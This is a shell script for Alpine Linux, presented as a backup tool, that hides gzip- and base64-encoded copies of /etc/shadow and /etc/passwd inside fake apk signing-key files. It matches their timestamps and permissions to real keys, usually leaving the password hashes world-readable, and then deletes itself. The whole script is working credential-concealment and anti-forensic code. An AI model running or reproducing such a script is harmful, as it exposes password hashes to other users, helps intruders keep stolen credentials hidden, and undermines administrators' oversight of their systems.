#!/bin/sh
# shadow_passwd_backup.sh - Alpine Linux version (POSIX sh / BusyBox ash, no bash needed)
#
# Hides compressed, base64-encoded copies of /etc/passwd and /etc/shadow as
# fake apk signing keys in /usr/share/apk/keys, a folder that exists on every
# stock Alpine install and is full of similar-looking *.rsa.pub files. apk
# never reads this folder (it only trusts /etc/apk/keys), so the decoys can't
# break package installs.
#
# Restore with shadow_passwd_restore.sh. Both scripts delete themselves after
# running, like the originals.

if [ ! -f /etc/alpine-release ] && [ "${SKIP_ALPINE_CHECK:-0}" != 1 ]; then
    echo "This is the Alpine Linux version of the script; use the original on other distros." >&2
    exit 1
fi

error() { echo "[ERROR] $*" >&2; exit 1; }

# ---------------------------
# Pre-flight checks
# ---------------------------
[ "$(id -u)" -eq 0 ] || error "This script must be run as root (use su or doas)."

DIR="/usr/share/apk/keys"
# Decoy names: shaped like real Alpine key files, but not used by any real key.
SHADOW_FILE="$DIR/alpine-devel@lists.alpinelinux.org-5d43a1b1.rsa.pub"
PASSWD_FILE="$DIR/alpine-devel@lists.alpinelinux.org-5fd8b2e4.rsa.pub"

[ -d "$DIR" ] || error "$DIR not found (is the alpine-keys package installed?)"
for cmd in base64 gzip fold; do
    command -v "$cmd" >/dev/null 2>&1 || error "'$cmd' not found"
done

# Never overwrite a real key that happens to share a decoy's name.
for f in "$SHADOW_FILE" "$PASSWD_FILE"; do
    if [ -e "$f" ] && apk info -W "$f" 2>/dev/null | grep -q 'is owned by'; then
        error "$f belongs to a package; edit the decoy names at the top of both scripts"
    fi
done

# A real key to copy timestamps, mode and owner from (picked at random).
REF=$(find "$DIR" -maxdepth 1 -type f -name '*.rsa.pub' 2>/dev/null \
      | grep -vxF -e "$SHADOW_FILE" -e "$PASSWD_FILE" \
      | { if command -v shuf >/dev/null 2>&1; then shuf -n1; else head -n1; fi; })

# write_decoy SOURCE DEST: gzip + base64, wrapped at 64 columns like a PEM key
write_decoy() {
    {
        echo '-----BEGIN PUBLIC KEY-----'
        gzip -9c < "$1" | base64 | tr -d '\n' | fold -w 64
        echo
        echo '-----END PUBLIC KEY-----'
    } > "$2" || error "could not write $2"
}

write_decoy /etc/shadow "$SHADOW_FILE"
write_decoy /etc/passwd "$PASSWD_FILE"

# Match timestamps, permissions, and ownership to a neighbor
for f in "$SHADOW_FILE" "$PASSWD_FILE"; do
    if [ -n "$REF" ]; then
        touch -r "$REF" "$f"
        chmod "$(stat -c '%a' "$REF")" "$f"
        chown "$(stat -c '%u:%g' "$REF")" "$f" 2>/dev/null
    else
        chmod 644 "$f"
    fi
done

echo "Saved. Restore with: sh shadow_passwd_restore.sh"
rm -- "$0"
